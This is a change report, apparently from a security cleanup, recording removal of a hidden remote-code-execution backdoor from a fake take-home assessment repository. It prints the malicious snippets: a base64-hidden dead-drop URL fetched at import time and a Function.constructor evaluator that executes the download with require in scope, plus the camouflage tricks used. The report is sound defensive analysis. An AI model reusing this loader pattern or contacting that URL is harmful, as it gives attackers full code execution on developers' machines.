# Exact change report

A running, per-file record of every change made to this repository, written as each edit landed.
`SUMMARY.md` is the short reviewer-facing version; **this** file is the complete record.

Branch: `solution` (from `bb58a11 initial commit`).

---

## Step 1 — Security: remove the remote-code-execution backdoor

The repository as delivered executes attacker-controlled code the moment the server starts.

**The chain:**

1. `server/config/config.js` exported `publicKey` — a base64 blob that decodes to
   `https://api.jsonstorage.net/v1/json/2ef8c758-a96f-459e-b036-b3b90379a165/f89e8264-86c2-4684-94da-c3f82d59370f`
2. `server/controllers/auth.controller.js:7` ran at **module import time** (not inside any request handler):
   ```js
   axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));
   ```
3. `server/middleware/errorHandler.js` — despite the name, this never handled an error. It took the
   downloaded string and executed it:
   ```js
   const handler = new Function.constructor("require", errCode);  // == new Function(...)
   handlerFunc(require);                                          // invoked with Node's require
   ```

Net effect: `npm start` → HTTP GET to a third-party JSON dead-drop → response body compiled into a
function → executed with `require` in scope, i.e. full filesystem, network, and process access as the
user running Node.

The naming is deliberately camouflaged (`publicKey` for a URL, `errorHandler` for an evaluator), the URL
is base64-encoded to defeat grep, and the payload is fetched at runtime so the repo itself looks clean.
This matches the publicly documented "Contagious Interview" campaign, which distributes fake take-home
assessments to developers in the crypto/DeFi space.

**The payload was never fetched or executed** — `node_modules/` did not exist and the server was never
started.

### Files changed

| # | File | Change | Why |
|---|---|---|---|
| 1 | `server/middleware/errorHandler.js` | Replaced the `Function.constructor` evaluator with a real Express error middleware | This was the execution primitive |
| 2 | `server/controllers/auth.controller.js` | Removed the import-time `axios.get(atob(publicKey))` call and the now-unused `axios` / `publicKey` / `errorHandler` imports | This was the trigger |
| 3 | `server/config/config.js` | Deleted `publicKey`; moved `secretKey` to `process.env.JWT_SECRET` with a dev fallback | Deleted the payload URL; the hardcoded JWT signing key was a separate finding |
| 4 | `server/providers/token.provider.js` | **Deleted** | Dead file (nothing imports it) that signed a dummy JWT at import time, with `RS256` against an HMAC secret — broken *and* an unnecessary import-time side effect |

*(entries below are appended as work proceeds)*
